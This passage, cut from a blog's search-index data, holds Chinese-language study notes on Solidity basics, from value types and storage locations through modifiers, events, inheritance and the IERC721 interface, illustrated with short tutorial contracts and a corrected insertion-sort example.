}\n\ntry-catch实战\nonlyEven\n我们创建一个外部合约OnlyEven，并使用try-catch来处理异常：\ncontract OnlyEven{\n    constructor(uint a){\n        require(a != 0, \"invalid number\");\n        assert(a != 1);\n    }\n\n    function onlyEven(uint256 b) external pure returns(bool success){\n        // 输入奇数时revert\n        require(b % 2 == 0, \"Ups! Reverting\");\n        success = true;\n    }\n}\n\nOnlyEven合约包含一个构造函数和一个onlyEven函数。\n\n\n构造函数有一个参数a，当a=0时，require会抛出异常；当a=1时，assert会抛出异常；其他情况均正常。\n\n\nonlyEven函数有一个参数b，当b为奇数时，require会抛出异常。\n\n\n处理外部函数调用异常\n首先，在TryCatch合约中定义一些事件和状态变量：\n    // 成功event\n    event SuccessEvent();\n\n    // 失败event\n    event CatchEvent(string message);\n    event CatchByte(bytes data);\n\n    // 声明OnlyEven合约变量\n    OnlyEven even;\n\n    constructor() {\n        even = new OnlyEven(2);\n    }\n\nSuccessEvent是调用成功会释放的事件，而CatchEvent和CatchByte是抛出异常时会释放的事件，分别对应require/revert和assert异常的情况。even是个OnlyEven合约类型的状态变量。\n然后我们在execute函数中使用try-catch处理调用外部函数onlyEven中的异常：\n    // 在external call中使用try-catch\n    function execute(uint amount) external returns (bool success) {\n        try even.onlyEven(amount) returns(bool _success){\n            // call成功的情况下\n            emit SuccessEvent();\n            return _success;\n        } catch Error(string memory reason){\n            // call不成功的情况下\n            emit CatchEvent(reason);\n        }\n    }\n\n","slug":"solidity进阶","date":"2022-12-07T15:23:57.000Z","categories_index":"","tags_index":"solidity","author_index":"cocoZ"},{"id":"3b889475d55359c53070293a35d903d7","title":"solidity入门","content":"solidity\n1.入门\n// SPDX-License-Identifier: MIT\t\t\t\t//这个代码所用的软件许可，如果不写许可，编译时会警告\npragma solidity ^0.8.4;\t\t\t\t//声明源文件所用的solidity版本\ncontract HelloWeb3{\t\t\t\t//创建合约（contract），并声明合约名字为Helloweb3\n    string public _string = \"Hello Web3!\";\t\t//合约的内容，声明了一个string（字符串）变量_string，并赋值\n}\n\n2.数值类型\n数值类型\n1.布尔型：二值变量，取值为** true或false**\nbool public  _bool = true;\n布尔值的运算符：！（逻辑非）、&amp;&amp;（逻辑与）、||（逻辑或）、==（等于）、！=（不等于）\n2.整型：\nint public _int = -1;\t\t\t//整数，包括负数\nuint public _uint = 1;\t\t\t//正整数\nuint256 public _number = 20220330;\t\t //256位正整数\nuint public _coco1 =2**4;\t\t//求指数2^4=16\nbool public _numberbool = _Uint &gt; _int;\t\t//比大小\n\n3.地址类型：存储一个20字节的值（以太坊地址的大小）。地址类型也由成员变量，并作为所有合约的基础。地址类型分为普通的地址和可以转账ETH的地址（payable）\npayable的地址拥有balance和transfer（）两个成员，方便查询ETH余额以及转账。\naddress public _address =0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;\naddress payable public _address1 = payable(_address);\t\t//payable address可以转账、查余额\nuint256 public balance = _address1.balance;  //address1的余额\n\n4.定长字节数组：字节数组bytes分为定长（byte,bytes8，bytes32）和不定长。（定长的属于数值类型，不定长的属于引用类型）定长byte可以存一些数据，消耗gas比较少\nbytes32 public _byte32 = \"Minisolidity\";\t\t//Minisolidity变量以字节的方式存储进变量_byte32，转换成16进制为：0x4d696e69536f6c69646974790000000000000000000000000000000000000000\nbytes1 public _byte = _byte32[0];\t\t//_byte变量存储_byte32的第一个字节，为0x4d\n\nTip：byte是bytes1的别名\n\n（Q:为啥每个元素会浪费31字节？)\n5.枚举enum\n枚举是solidity中用户定义的数据类型，主要为uint分配名称，使程序易于阅读和维护（参考c语言）\nenum ActionSet{Buy,hold,Sell}\t\t//用enum将unit 0， 1， 2表示为Buy, Hold, Sell\nActionSet action = ActionSet.Buy;\t//创建enum变量action\n\n\n（Q:这段话有点看不懂，啥叫显式的和uint相互转换？然后检查是怎么检查的？)\n\nemmmmm，懂了，我觉得就是数组名称和数组索引的转换，检查是自动会检查的，如果不在长度内会报错\n3.函数类型\n函数\n    function &lt;function name&gt;(&lt;parameter types&gt;) {internal|external|public|private} [pure|view|payable] [returns (&lt;return types&gt;)]\n\n    function 函数名(输入到函数的变量类型和名字) 函数可见性说明符 决定函数权限/功能的关键字 returns(函数返回的变量类型和名称)\n\n1.function：声明函数的关键字\n2.&lt;function name&gt;：函数名\n3.(&lt;parameter types&gt;)：函数的参数，变量类型+变量名\n4.{internal|external|public|private}：函数可见性说明符，一共4种（没标明函数类型的，默认internal）\n\n\npublic：内部外部都可见（也可以用于修饰状态变量，public变量会自动生成getter函数，用于查询数据）\n\n\nprivate：只能从合约内部访问，继承的合约也不能用（也可用于修饰状态变量）\n\n\nexternal：只能从合约外部访问（但是可以用this.f()来调用，f是函数名）\n\n\ninternal：只能从合约内部访问，继承的合约可以用（也可以用于修饰状态变量）\n5.[pure|view|payable]：决定函数权限/功能的关键字。（payable运行时可以给合约转入ETH）\n6.[returns()]：函数返回的变量类型和名称\n\n\n\neg: function getData() external view returns(uint256) {\n         return data;\n     } \n\n关于pure和view\n在合约里面定义一个状态变量number=5\n// SPDX-License-Indentifier:MIT\npragma solidity ^0.8.4;\ncontract FunctionTypes{\nuint256 public number=5;\n\n定义一个add()函数，每次调用，每次给number+1\n//默认\nfunction add() external{\nnumber=number+1;\n}\n\n如果add()包含了pure关键字，例如function add() pure external，就会报错。pure没有权限读取合约的相关变量，更没有权限改写。pure函数能干啥捏？(pure：纯纯牛马emmmmm)\neg：可以给函数传递一个参数_number，然后让他返回_number+1\nfunction addPure(uint256 _number) external pure returns(uint256 new_number){\nnew_number=_number+1;\n}\n\n\n如图，在_number位置传入一个参数7，就会执行函数，得到输出结果为8\n如果add()包含view，比如function add() view external也会报错。因为view能读取，但是不能够改写状态变量。可以稍微改一下，让其不改写number，而是返回一个新的变量。(view：看客)\nuint public number=1;\nfunction addView() external view returns(uint256 new_number){\nnew_number=number+1;\n}\n\n\n点击addView这个函数就会直接读取number=5，直接输出number3=6\n（Q:遇到一个问题，就是这样子写报错了，addView函数里面写uint256 number=5也会报错，我觉得是因为view只有读取的权限没有写入的权限，是嘛是嘛？？？）\n\n\n为什么引入pure和view关键字\nsolidity引入pure和view关键字主要是为了节省gas和控制函数权限：如果用户直接调用pure/view方程是不消耗gas的（合约中非pure/gas函数调用它们则会改写链上状态，需要付gas）\n关于internal和external\n（Q：我自己问出了一个很蠢的问题：怎么区分合约内部和外部）我思考了一下，还是要回到1入门那边，最开始学习到的创建一个合约\n\n所以我知道怎么区分了（所以我是pure，纯纯牛马一个\n//internal:内部\nfunction minus() internal{\nnumber=number-1;\n}\n//合约内的函数可以调用内部函数\nfunction minusCall() external(){\nminus();\n}\n\n定义一个internal的minus()函数，每次调用使number-1。由于是internal，只能从合约内部调用，不能从外部。因此，还要再定义一个external的minusCall()函数，来直接调用内部的minus()\n\n图片里面只能看到minus222（）看不到minus（）这样子\n（Tip：我的理解是internal有像把函数写进合约内部，然后external是写在外部，直接调用即可。)（这样子理解有问题否？？？？？\npayable\n//payable：递钱，能给合约支付ETH的函数\nfunction minusPayable() external payable returns(uint256 balance){\nminus();\nbalance=address(this).balance;\n}\n\n定义一个external payable的minusPayable()函数，间接的调用minus()，并且返回合约里的ETH余额（this关键字可以让我们引用合约地址）我们可以再调用minusPayable()时，往合约里转入1个ETH\n\n是这样的，可以在左下角看到余额balance：1ETH\n\n4.函数输出return\n返回值return和returns\nreturn和returns这两个关键字与函数输出相关。区别在于：\n\n\nreturns加在函数名后面，用于声明返回的变量类型及变量名；\n\n\nreturns用于函数主体中，返回指定的变量。\n\n\n//返回多个变量\nfunction returnMultiple() public pure returns(uint256,bool,uint256[3] memory){\nreturn(1,true,[uint256(1),2,5]);\n}\n\n声明了returnMultiple()函数将有多个输出：returns(uint256,bool,uint256[3] memory)，接着在函数的主体中用return(1,true,[uint256(1),2,5])确定了返回值\n命名式返回\n我们可以在returns中 标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return\n    // 返回多个变量\n    function returnMultiple() public pure returns(uint256, bool, uint256[3] memory){\n            return(1, true, [uint256(1),2,5]);\n        }\n\n改为\n    // 命名式返回\n    function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array){\n        _number = 2;\n        _bool = false; \n        _array = [uint256(3),2,1];\n    }\n\nTip:也可以在命名式返回中用return来返回变量，跟第一种一样\n解构式赋值\n\n\n读取所有返回值：声明变量，并且将要赋值的变量用,隔开，按顺序排列。\n\n\n        uint256 _number;\n        bool _bool;\n        uint256[3] memory _array;\n        (_number, _bool, _array) = returnNamed();\n\n\n\n读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。下面这段代码中，我们只读取_bool，而不读取返回的_number和_array：\n\n\n        (, _bool2, ) = returnNamed();\n\n5.变量数据存储和作用域\n引用类型(Reference Type)\n数组(array)、结构体(struct)和映射(mapping)，这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。\n数据位置\nstorage、memory和calldata。不同存储位置的gas成本不同：storage类型的数据存在链上，类似计算机的硬盘，消耗gas多；memory和calldata类型的临时存在内存里，消耗gas少。\n\n\nstorage：合约里的状态变量默认都是storage，存储在链上。\n\n\nmemory：函数里的参数和临时变量一般用memory，存储在内存中，不上链。\n\n\ncalldata：和memory类似，存储在内存中，不上链。与memory的不同点在于calldata变量不能修改（immutable），一般用于函数的参数。eg：\n\n\n    function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata){\n        //参数为calldata数组，不能被修改\n        // _x[0] = 0 //这样修改会报错\n        return(_x);\n    }\n\n赋值规则\n在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。规则如下：\n\n\nstorage（合约的状态变量）赋值给本地storage（函数里的）时候，会创建引用，改变新变量会影响原变量。eg：\n\n\n    uint[] x = [1,2,3]; // 状态变量：数组 x\n\n    function fStorage() public{\n        //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x\n        uint[] storage xStorage = x;\n        xStorage[0] = 100;\n    }\n\n\n\nstorage赋值给memory，会创建独立的复本，修改其中一个不会影响另一个；反之亦然。\n\n\n    uint[] x = [1,2,3]; // 状态变量：数组 x\n    \n    function fMemory() public view{\n        //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x\n        uint[] memory xMemory = x;\n        xMemory[0] = 100;\n        xMemory[1] = 200;\n        uint[] memory xMemory2 = x;\n        xMemory2[0] = 300;\n    }\n\ndebug康康\n\n\n\n\nmemory赋值给memory，会创建引用，改变新变量会影响原变量\n\n\n其他情况，变量赋值给storage，会创建独立的复本，修改其中一个不会影响另一个\n\n\n作用域\n\n\n状态变量\n数据存储在链上的变量，所有的合约内的函数都可以访问，gas消耗高。状态变量在合约内、函数外声明（可以在函数里更改状态变量的值）\n\n\n局部变量\n局部变量是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，gas低。局部变量在函数内声明\n\n\n    function bar() external pure returns(uint){\n        uint xx = 1;\n        uint yy = 3;\n        uint zz = xx + yy;\n        return(zz);\n    }\n\n\n\n全局变量\n全局变量是全局范围工作的变量，都是solidity预留关键字（可以在函数内不声明直接使用）\n\n\n    function global() external view returns(address, uint, bytes memory){\n        address sender = msg.sender;\n        uint blockNum = block.number;\n        bytes memory data = msg.data;\n        return(sender, blockNum, data);\n    }\n\n\n6.引用类型\n数组array\n数组（Array）是solidity常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）\n\n\n固定长度数组：在声明时指定数组的长度。用T[k]的格式表明，其中T是元素的类型，k是长度，eg:\n\n\n    // 固定长度 Array\n    uint[8] array1;\n    bytes1[5] array2;\n    address[100] array3;\n\n\n\n可变长度数组（动态数组）：在声明时不指定数值的长度。用T[]的格式表明，其中T是元素的类型（bytes比较特殊，是数组，但是不加[]），eg：\n\n\n    // 可变长度 Array\n    uint[] array4;\n    bytes1[] array5;\n    address[] array6;\n    bytes array7;\n\n创建数组的规则\n\n\n对于memory修饰的动态数组，可以用new操作符来创建，但是必须声明长度，并且声明后长度不能改变，eg：\n\n\n    // memory动态数组\n    uint[] memory array8 = new uint[](5);\n    bytes memory array9 = new bytes(9);\n\n\n\n数组字面常数（Array Literals）是写作表达形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如[1,2,3]里面所有的元素都是uint8类型，因为在solidity中如果一个值没有指定type的话，默认就是最小单位的该type，这里int的默认最小单位类型就是uint8。而[uint(1),2,3]里面的元素都是uint类型，因为第一个元素指定了是uint类型了，我们都以第一个元素为准。下面的合约中，对于f函数里面的调用，如果我们没有显式对第一个元素进行uint强转的话，是会报错的，因为如上所述我们其实是传入了uint8类型的array，可是g函数需要的却是uint类型的array，就会报错了。\n\n\n// SPDX-License-Identifier: GPL-3.0\npragma solidity &gt;=0.4.16 &lt;0.9.0;\ncontract C {\n    function f() public pure {\n        g([uint(1), 2, 3]);\t //uint(1)强转了。如果是g([1,2,3]),就是uint8类型\n    }\n    function g(uint[3] memory) public pure {\t//g()这边传入的是uint类型\n        // ...\n    }\n}\n\n\n\n如果创建的是动态数组，你需要一个一个元素的赋值。\n\n\n    uint[] memory x = new uint[](3);\n    x[0] = 1;\n    x[1] = 3;\n    x[2] = 4;\n\n数组成员\n\n结构体\n创建结构体\n    // 结构体\n    struct Student{\n        uint256 id;\n        uint256 score; \n    }\n\n    Student student; // 初始一个student结构体\n\n给结构体赋值的两种方法\n    //  给结构体赋值\n    // 方法1:在函数中创建一个storage的struct引用\n    function initStudent1() external{\n        Student storage _student = student; // assign a copy of student\n        _student.id = 11;\n        _student.score = 100;\n    }\n\n     // 方法2:直接引用状态变量的struct\n    function initStudent2() external{\n        student.id = 1;\n        student.score = 80;\n    }\n\n7.映射类型\nmapping\n在映射中，人们可以通过键（Key）来查询对应的值（Value），比如：通过一个人的id来查询他的钱包地址。\nmapping(_KeyType =&gt; _ValueType)eg:\n    mapping(uint =&gt; address) public idToAddress; // id映射到地址\n    mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址\n\n映射的规则\n\n\n规则1：映射的_KeyType只能选择solidity默认的类型，比如uint，address等，不能用自定义的结构体。而_ValueType可以使用自定义的类型。\n\n\n规则2：映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系 (key - value pair)。\n\n\n规则3：如果映射声明为public，那么solidity会自动给你创建一个getter函数，可以通过Key来查询对应的Value。\n\n\n规则4：给映射新增的键值对的语法为_Var[_Key] = _Value，其中_Var是映射变量名，_Key和_Value对应新增的键值对。eg：\n\n\n    function writeMap (uint _Key, address _Value) public{\n        idToAddress[_Key] = _Value;\n    }\n\n映射的原理\n\n\n原理1：映射不储存任何键（Key）的资讯，也没有length的资讯。\n\n\n原理2：映射使用keccak256(key)当成offset存取value。\n\n\n原理3：因为Ethereum会定义所有未使用的空间为0，所以未赋值（Value）的键（Key）初始值都是0。\n\n\n8.变量初始值\n声明但没赋值的变量都是有初始值\n值类型初始值\n\n\nboolean:false\n\n\nstring:\"\"\n\n\nint:0\n\n\nuint:o\n\n\nenum:枚举的第一个元素\n\n\naddress:0x0000000000000000000000000000000000000000(或address(0))\n\n\nfunction\n\ninternal:空白方程\nexternal:空白方程\n\n\n\n可以用public变量的getter函数验证初始值：\n\tbool public _bool;\n\t......\n\n引用类型初始值\n\n\n映射mapping：所有元素都为其默认值的mapping\n\n\n结构体struct：所有成员都设为其默认值的结构题\n\n\n数组array：\n\n动态数组：[]\n静态数组：所有成员设为其默认值的静态数组\n\n\n\n验证方式一样，eg：\n    mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping\n    \n        // 所有成员设为其默认值的结构体 0, 0\n    struct Student{\n        uint256 id;\n        uint256 score; \n    }\n    Student public student;\n\ndelete操作符\ndelete a会让变量a的值变为初始值\n9.常数\nconstant（常量）和immutable（不变量）。状态变量声明这个两个关键字之后，不能在合约后更改数值；并且还可以节省gas。另外，只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable。\nconstant\nconstant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。\n    // constant变量必须在声明的时候初始化，之后不能改变\n    uint256 constant CONSTANT_NUM = 10;\n    string constant CONSTANT_STRING = \"0xAA\";\n    bytes constant CONSTANT_BYTES = \"WTF\";\n    address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;\n\nimmutable\nimmutable变量可以在声明时或构造函数中初始化，因此更加灵活。\n    // immutable变量可以在constructor里初始化，之后不能改变\n    uint256 public immutable IMMUTABLE_NUM = 9999999999;\n    address public immutable IMMUTABLE_ADDRESS;\n    uint256 public immutable IMMUTABLE_BLOCK;\n    uint256 public immutable IMMUTABLE_TEST;\n\n可以使用全局变量例如address(this)，block.number ，或者自定义的函数给immutable变量初始化。在下面这个例子，我们利用了test()函数给IMMUTABLE_TEST初始化为9：\n    // 利用constructor初始化immutable变量，因此可以利用\n    constructor(){\n        IMMUTABLE_ADDRESS = address(this);\n        IMMUTABLE_BLOCK = block.number;\n        IMMUTABLE_TEST = test();\n    }\n\n    function test() public pure returns(uint256){\n        uint256 what = 9;\n        return(what);\n    }\n\n10.控制流\n\n\nif-else\n\n\nfor循环\n\n\nwhie循环\n\n\ndo-while循环\n\n\n三元运算符：三元运算符是solidity中唯一一个接受三个操作数的运算符，规则条件? 条件为真的表达式:条件为假的表达式。 此运算符经常用作 if 语句的快捷方式。\n\n\n// 三元运算符 ternary/conditional operator\nfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256){\n    // return the max of x and y\n    return x &gt;= y ? x: y; \n}\n\n用solidity实现插入排序\n插入排序\n排序算法解决的问题是将无序的一组数字，例如[2, 5, 3, 1]，从小到大依次排列好。（思路：从前往后，依次将每一个数和排在他前面的数字比大小，如果比前面的数字小，就互换位置。）\n贴个python代码\n# Python program for implementation of Insertion Sort\ndef insertionSort(arr):\n    for i in range(1, len(arr)):\n        key = arr[i]\n        j = i-1\n        while j &gt;=0 and key &lt; arr[j] :\n                arr[j+1] = arr[j]\n                j -= 1\n        arr[j+1] = key\n\n改写成solidity后有BUG！\n    // 插入排序 错误版\n    function insertionSortWrong(uint[] memory a) public pure returns(uint[] memory) {\n        \n        for (uint i = 1;i &lt; a.length;i++){\n            uint temp = a[i];\n            uint j=i-1;\n            while( (j &gt;= 0) &amp;&amp; (temp &lt; a[j])){\n                a[j+1] = a[j];\n                j--;\n            }\n            a[j+1] = temp;\n        }\n        return(a);\n    }\n\n原因：solidity中最常用的变量类型是uint，也就是正整数，取到负值的话，会报underflow错误。而在插入算法中，变量j有可能会取到-1，引起报错。这里把j加1，让它无法取到赋值\n    // 插入排序 正确版\n    function insertionSort(uint[] memory a) public pure returns(uint[] memory) {\n        // note that uint can not take negative value\n        for (uint i = 1;i &lt; a.length;i++){\n            uint temp = a[i];\n            uint j=i;\n            while( (j &gt;= 1) &amp;&amp; (temp &lt; a[j-1])){\n                a[j] = a[j-1];\n                j--;\n            }\n            a[j] = temp;\n        }\n        return(a);\n    }\n\n11.构造函数和修饰器\n构造函数\n构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的owner地址：\n   address owner; // 定义owner变量\n\n   // 构造函数\n   constructor() {\n      owner = msg.sender; // 在部署合约的时候，将owner设置为部署者的地址\n   }\n\nTip:构造函数在不同的solidity版本中的语法并不一致，在Solidity 0.4.22之前，构造函数不使用 constructor 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 Parents，构造函数名写成 parents），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 constructor 写法。\npragma solidity =0.4.21;\ncontract Parents {\n    // 与合约名Parents同名的函数就是构造函数\n    function Parents () public {\n    }\n}\n\n修饰器\n修饰器（modifier）是solidity特有的语法，类似于面向对象编程中的decorator，声明函数拥有的特性，并减少代码冗余。modifier的主要使用场景是运行函数前的检查，例如地址，变量，余额等。\n   // 定义modifier\n   modifier onlyOwner {\n      require(msg.sender == owner); // 检查调用者是否为owner地址\n      _; // 如果是的话，继续运行函数主体；否则报错并revert交易\n   }\n\n带有onlyOwner修饰符的函数只能被owner地址调用，比如下面这个例子：\n   function changeOwner(address _newOwner) external onlyOwner{\n      owner = _newOwner; // 只有owner地址运行这个函数，并改变owner\n   }\n\n我们定义了一个changeOwner函数，运行他可以改变合约的owner，但是由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。\n12.事件\nSolidity中的事件（event）是EVM上日志的抽象，它具有两个特点：\n\n\n应用程序（ether.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。\n\n\n事件是EVM上比较经济的存储数据的方式，每个大概消耗2,000 gas；相比之下，链上存储一个新变量至少需要20,000 gas。\n\n\n规则\n事件的声明由event关键字开头，然后跟事件名称，括号里面写好事件需要记录的变量类型和变量名。以ERC20代币合约的Transfer事件为例：\nevent Transfer(address indexed from, address indexed to, uint256 value);\n\nTransfer事件共记录了3个变量from，to和value，分别对应代币的转账地址，接收地址和转账数量。\n同时from和to前面带着indexed关键字，每个indexed标记的变量可以理解为检索事件的索引“键”，在以太坊上单独作为一个topic进行存储和索引，程序可以轻松的筛选出特定转账地址和接收地址的转账事件。每个事件最多有3个带indexed的变量。每个 indexed 变量的大小为固定的256比特。事件的哈希以及这三个带indexed的变量在EVM日志中通常被存储为topic。其中topic[0]是此事件的keccak256哈希，topic[1]到topic[3]存储了带indexed变量的keccak256哈希。\n\nvalue 不带 indexed 关键字，会存储在事件的 data 部分中，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topic 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topic 更少。\n可以在函数里释放事件：\n    // 定义_transfer函数，执行转账逻辑\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) external {\n\n        _balances[from] = 10000000; // 给转账地址一些初始代币\n\n        _balances[from] -=  amount; // from地址减去转账数量\n        _balances[to] += amount; // to地址加上转账数量\n\n        // 释放事件\n        emit Transfer(from, to, amount);\n    }\n\n13.继承\n规则\n\n\nvirtual: 父合约中的函数，如果希望子合约重写，需要加上virtual关键字。\n\n\noverride：子合约重写了父合约中的函数，需要加上override关键字。\n\n\n简单继承\n（确实比较简单，直接贴例子）\n先写一个简单的爷爷合约Yeye，里面包含1个Log事件和3个function: hip(), pop(), yeye()，输出都是”Yeye”。\ncontract Yeye {\n    event Log(string msg);\n\n    // 定义3个function: hip(), pop(), man()，Log值为Yeye。\n    function hip() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function pop() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function yeye() public virtual {\n        emit Log(\"Yeye\");\n    }\n}\n\n再定义一个爸爸合约Baba，让他继承Yeye合约，语法就是contract Baba is Yeye，非常直观。在Baba合约里，我们重写一下hip()和pop()这两个函数，加上override关键字，并将他们的输出改为”Baba”；并且加一个新的函数baba，输出也是”Baba”。\ncontract Baba is Yeye{\n    // 继承两个function: hip()和pop()，输出改为Baba。\n    function hip() public virtual override{\n        emit Log(\"Baba\");\n    }\n\n    function pop() public virtual override{\n        emit Log(\"Baba\");\n    }\n\n    function baba() public virtual{\n        emit Log(\"Baba\");\n    }\n}\n\n部署合约，可以看到Baba合约里有4个函数，其中hip()和pop()的输出被成功改写成”Baba”，而继承来的yeye()的输出仍然是”Yeye”。\n多重继承\nsolidity合约可以继承多个合约\n继承时要按辈分最高到最低的顺序排。比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成contract Erzi is Yeye, Baba，而不能写成contract Erzi is Baba, Yeye，不然就会报错。 如果某一个函数在多个继承的合约里都存在，比如例子中的hip()和pop()，在子合约里必须重写，不然会报错。 重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字，例如override(Yeye, Baba)。 例子：\ncontract Erzi is Yeye, Baba{\n    // 继承两个function: hip()和pop()，输出值为Erzi。\n    function hip() public virtual override(Yeye, Baba){\n        emit Log(\"Erzi\");\n    }\n\n    function pop() public virtual override(Yeye, Baba) {\n        emit Log(\"Erzi\");\n    }\n\n修饰器的继承\nSolidity中的修饰器（Modifier）同样可以继承，用法与函数继承类似，在相应的地方加virtual和override关键字即可。\ncontract Base1 {\n    modifier exactDividedBy2And3(uint _a) virtual {\n        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);\n        _;\n    }\n}\n\ncontract Identifier is Base1 {\n\n    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数\n    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) {\n        return getExactDividedBy2And3WithoutModifier(_dividend);\n    }\n\n    //计算一个数分别被2除和被3除的值\n    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint){\n        uint div2 = _dividend / 2;\n        uint div3 = _dividend / 3;\n        return (div2, div3);\n    }\n}\n\nIdentifier合约可以直接在代码中使用父合约中的exactDividedBy2And3修饰器，也可以利用override关键字重写修饰器：\n    modifier exactDividedBy2And3(uint _a) override {\n        _;\n        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);\n    }\n\n构造函数的继承\n子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约A里面有一个状态变量a，并由构造函数的参数来确定：\n// 构造函数的继承\nabstract contract A {\n    uint public a;\n\n    constructor(uint _a) {\n        a = _a;\n    }\n}\n\n1.在继承时声明父构造函数的参数，例如：contract B is A(1)\n2.在子合约的构造函数中声明构造函数的参数，例如：\ncontract C is A {\n    constructor(uint _c) A(_c * _c) {}\n}\n\n调用父合约的函数\n子合约有两种调用父合约的函数\n\n\n直接调用：子合约可以直接用父合约名.函数名()的方式来调用父合约函数，例如Yeye.pop()。\n\n\n    function callParent() public{\n        Yeye.pop();\n    }\n\n\n\nsuper关键字：子合约可以利用super.函数名()来调用最近的父合约函数。solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()：\n\n\n    function callParentSuper() public{\n        // 将调用最近的父合约函数，Baba.pop()\n        super.pop();\n    }\n\n14.抽象合约和接口\n抽象合约\n如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体{}中的内容，则必须将该合约标为abstract，不然编译会报错；另外，未实现的函数需要加virtual，以便子合约重写。拿我们之前的插入排序合约为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为abstract，之后让别人补写上。\nabstract contract InsertionSort{\n    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);\n}\n\n接口\n接口类似于抽象合约，但不实现任何功能。规则：\n\n\n不能包含状态变量\n\n\n不能包含构造函数\n\n\n不能继承除接口外的其他合约\n\n\n所有函数都必须是external且不能有函数体\n\n\n继承接口的合约必须实现接口定义的所有功能\n\n\n虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如ERC20或ERC721），其他Dapps和智能合约就知道如何与它交互。因为接口提供了两个重要的信息：\n1.合约里每个函数的bytes4选择器，以及基于它们的函数签名函数名(每个参数类型）。\n2.接口id（更多信息见EIP165）\n另外，接口与合约ABI（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的ABI，利用abi-to-sol工具也可以将ABI json文件转换为接口sol文件。\n我们以ERC721接口合约IERC721为例，它定义了3个event和9个function，所有ERC721标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。\ninterface IERC721 is IERC165 {\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\n    \n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\n\n    function transferFrom(address from, address to, uint256 tokenId) external;\n\n    function approve(address to, uint256 tokenId) external;\n\n    function getApproved(uint256 tokenId) external view returns (address operator);\n\n    function setApprovalForAll(address operator, bool _approved) external;\n\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\n\n    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;\n}\n\nIERC721事件\nIERC721包含3个事件，其中Transfer和Approval事件在ERC20中也有。\n\n\nTransfer事件：在转账时被释放，记录代币的发出地址from，接收地址to和tokenid。\n\n\nApproval事件：在授权时释放，记录授权地址owner，被授权地址approved和tokenid。\n\n\nApprovalForAll事件：在批量授权时释放，记录批量授权的发出地址owner，被授权地址operator和授权与否的approved。\n\n\nIERC721函数\n\n\nbalanceOf：返回某地址的NFT持有量balance。\n\n\nownerOf：返回某tokenId的主人owner。\n\n\ntransferFrom：普通转账，参数为转出地址from，接收地址to和tokenId。\n\n\nsafeTransferFrom：安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。参数为转出地址from，接收地址to和tokenId。\n\n\napprove：授权另一个地址使用你的NFT。参数为被授权地址approve和tokenId。\n\n\ngetApproved：查询tokenId被批准给了哪个地址。\n\n\nsetApprovalForAll：将自己持有的该系列NFT批量授权给某个地址operator。\n\n\nisApprovedForAll：查询某地址的NFT是否批量授权给了另一个operator地址。\n\n\nsafeTransferFrom：安全转账的重载函数，参数里面包含了data。\n\n\n什么时候使用接口\n如果我们知道一个合约实现了IERC721接口，我们不